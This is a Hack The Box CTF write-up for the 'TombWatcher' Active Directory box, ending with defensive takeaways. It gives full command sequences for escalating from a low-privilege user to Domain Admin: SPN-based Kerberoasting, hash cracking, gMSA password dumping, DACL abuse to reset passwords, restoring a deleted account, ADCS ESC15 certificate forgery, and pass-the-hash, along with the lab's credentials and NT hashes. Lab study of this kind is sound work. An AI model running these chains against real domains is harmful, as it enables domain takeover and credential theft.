# TombWatcher — HTB (Active Directory)

**TombWatcher** is an assumed-breach Active Directory box: you start with one low-privileged user and chain a long series of ACL and delegation misconfigurations up to Domain Admin. It's a great tour of modern AD abuse — Kerberoasting via a self-granted SPN, gMSA password reads, `ForceChangePassword` / `WriteOwner` / `GenericAll` DACL abuse, resurrecting a tombstoned account from the AD Recycle Bin, and finally **ADCS ESC15 (CVE-2024-49019)** to forge an Administrator certificate.

> **Platform:** Hack The Box · **Category:** Active Directory · **OS:** Windows · **Tools:** BloodHound, bloodyAD, Impacket, Certipy, Evil-WinRM

Flags are intentionally redacted; this is about the attack path, not the values.

## Recon

```bash
sudo nmap -sC -sV -Pn 10.10.11.72 -oN nmap.txt
```

The usual domain-controller surface — `DC01.tombwatcher.htb`, Kerberos (88), LDAP(S) (389/636/3268/3269), SMB (445), WinRM (5985), plus DNS and IIS. SMB signing is required, and there's a ~4-hour clock skew to watch out for later (Kerberos is picky about time).

We're handed a foothold user, `henry : H3nry_987TGV!`, so the game is privilege escalation through the domain's ACLs.

## henry → alfred: self-granted SPN + Kerberoast

BloodHound shows `henry` has **`WriteSPN`** over `alfred`. That's enough to make `alfred` Kerberoastable: write a fake SPN onto the account, then request a service ticket and crack it offline.

![henry has WriteSPN over alfred](writeups/images/tw-1-writespn.jpg)

```bash
bloodyAD -d tombwatcher.htb -u henry -p 'H3nry_987TGV!' --host 10.10.11.72 \
  set object alfred servicePrincipalName -v "HTTP/fake.tombwatcher.htb"
# [+] alfred's servicePrincipalName has been updated
```

Fix the clock skew, then Kerberoast:

```bash
sudo ntpdate 10.10.11.72
GetUserSPNs.py -dc-ip 10.10.11.72 'tombwatcher.htb/henry:H3nry_987TGV!' -request-user alfred
# -> $krb5tgs$23$*Alfred$TOMBWATCHER.HTB$...
```

![Kerberoast TGS-REP for alfred](writeups/images/tw-2-kerberoast.jpg)

```bash
hashcat -m 13100 alfred.hash rockyou.txt
# ...de307b:basketball
```

`alfred : basketball`.

## alfred → Infrastructure → gMSA read

`alfred` has **`AddSelf`** on the `Infrastructure` group, so he can add himself:

![alfred can AddSelf to Infrastructure](writeups/images/tw-3-addself.jpg)

```bash
bloodyAD --host 10.10.11.72 -d tombwatcher.htb -u alfred -p basketball \
  add groupMember infrastructure alfred
# [+] alfred added to infrastructure
```

Members of `Infrastructure` can **read the gMSA password** for `ansible_dev$`. [gMSADumper](https://github.com/micahvandeusen/gMSADumper) pulls the managed-password blob and derives the hashes:

![Infrastructure can read the gMSA password](writeups/images/tw-4-gmsa.jpg)

```bash
python3 gMSADumper.py -u alfred -p basketball -d tombwatcher.htb -l 10.10.11.72
# ansible_dev$:::ecb4146b3f99e6bbf06ca896f504227c
```

## ansible_dev$ → sam: ForceChangePassword

The `ansible_dev$` machine account has **`ForceChangePassword`** over `sam`. Authenticate with the NT hash (pass-the-hash) and reset `sam`'s password over MS-RPC:

![ansible_dev$ can ForceChangePassword on sam](writeups/images/tw-5-forcechange.jpg)

```bash
rpcclient -U "ansible_dev$%ecb4146b3f99e6bbf06ca896f504227c" 10.10.11.72 --pw-nt-hash
rpcclient $> setuserinfo2 sam 23 'Password123!'
```

## sam → john: WriteOwner → GenericAll

`sam` has **`WriteOwner`** over `john` (a member of **Remote Management Users**). Take ownership, grant yourself `GenericAll`, then reset the password:

![sam has WriteOwner over john](writeups/images/tw-6-writeowner.jpg)

```bash
owneredit.py -action write -target john -new-owner sam \
  'tombwatcher.htb/sam:Password123!' -dc-ip 10.10.11.72

bloodyAD --host 10.10.11.72 -d tombwatcher.htb -u sam -p 'Password123!' \
  add genericAll john sam

bloodyAD --host 10.10.11.72 -d tombwatcher.htb -u sam -p 'Password123!' \
  set password john 'Password36!'
```

`john` is in Remote Management Users, so WinRM is open:

```bash
evil-winrm -i 10.10.11.72 -u john -p 'Password36!'
*Evil-WinRM* PS C:\Users\john\Desktop> type user.txt    # user flag captured (redacted)
```

## Root — AD Recycle Bin + ADCS ESC15

BloodHound shows `john` has **`GenericAll`** over the **ADCS** OU. But the interesting principal, `cert_admin`, is a **deleted (tombstoned) object**. First, restore it from the AD Recycle Bin and re-enable it:

![john has GenericAll over the ADCS OU](writeups/images/tw-7-adcs.jpg)

```powershell
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects
Restore-ADObject -Identity 938182c3-bf0b-410a-9aaa-45c8e1a02ebf
Enable-ADAccount -Identity cert_admin
Set-ADAccountPassword -Identity cert_admin -Reset \
  -NewPassword (ConvertTo-SecureString "Password69!" -AsPlainText -Force)
```

Give `john` full control over the ADCS OU so the restored account inherits the rights we need, then enumerate templates with Certipy:

```bash
dacledit.py -action write -rights FullControl -inheritance -principal john \
  -target-dn 'OU=ADCS,DC=TOMBWATCHER,DC=HTB' 'tombwatcher.htb/john:Password36!' -dc-ip 10.10.11.72

certipy find -vulnerable -u cert_admin -p 'Password69!' -dc-ip 10.10.11.72 -ns 10.10.11.72
```

![cert_admin restored and enabled](writeups/images/tw-8-certadmin.jpg)

### ESC15 (CVE-2024-49019) — "EKUwu" arbitrary application-policy injection

The CA exposes a **V1 template with "Enrollee supplies subject"**, which is vulnerable to [ESC15](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu). I used the enrollment-agent (Scenario B) variant.

**Step 1 — request a cert injecting the "Certificate Request Agent" application policy:**

```bash
certipy-ad req -u 'cert_admin@tombwatcher.htb' -p 'Password69!' \
  -dc-ip 10.10.11.72 -ca 'tombwatcher-CA-1' \
  -template 'WebServer' -application-policies 'Certificate Request Agent'
# -> cert_admin.pfx  (now usable as an enrollment agent)
```

**Step 2 — use that agent cert to enrol *on behalf of* Administrator** (this is the step the raw notes were missing):

```bash
certipy-ad req -u 'cert_admin@tombwatcher.htb' -p 'Password69!' \
  -dc-ip 10.10.11.72 -ca 'tombwatcher-CA-1' -template 'User' \
  -pfx cert_admin.pfx -on-behalf-of 'tombwatcher\Administrator'
# -> administrator.pfx
```

**Step 3 — authenticate with the Administrator certificate to recover the NT hash** (wrap in `faketime` to beat the clock skew):

```bash
faketime "$(ntpdate -q 10.10.11.72 | cut -d' ' -f1,2)" \
  certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.72
# [*] Got hash for 'administrator@tombwatcher.htb': aad3b435...:f61db423bebe3328d33af26741afe5fc
```

**Step 4 — pass-the-hash to a Domain Admin shell:**

```bash
evil-winrm -i 10.10.11.72 -u administrator -H f61db423bebe3328d33af26741afe5fc
*Evil-WinRM* PS C:\Users\Administrator\Documents> type ..\Desktop\root.txt   # root flag captured (redacted)
```

## Takeaways (defender view)

- **Every hop was an ACL, not an exploit.** `WriteSPN`, `AddSelf`, `ForceChangePassword`, `WriteOwner`, `GenericAll` — misconfigured object permissions are the real attack surface in AD. Audit them with BloodHound before an attacker does.
- **gMSA reads are privilege.** Membership that can read a gMSA password is equivalent to owning that service account; treat those groups as Tier-0.
- **The AD Recycle Bin is in scope.** Deleted objects retain their SIDs and can be restored and reused — review who can restore objects and what rights those objects carry.
- **Patch ESC15 (CVE-2024-49019).** V1 templates with "Enrollee supplies subject" let a low-priv user inject application policies and impersonate anyone. Remove/tighten vulnerable templates and enable strong certificate mapping.
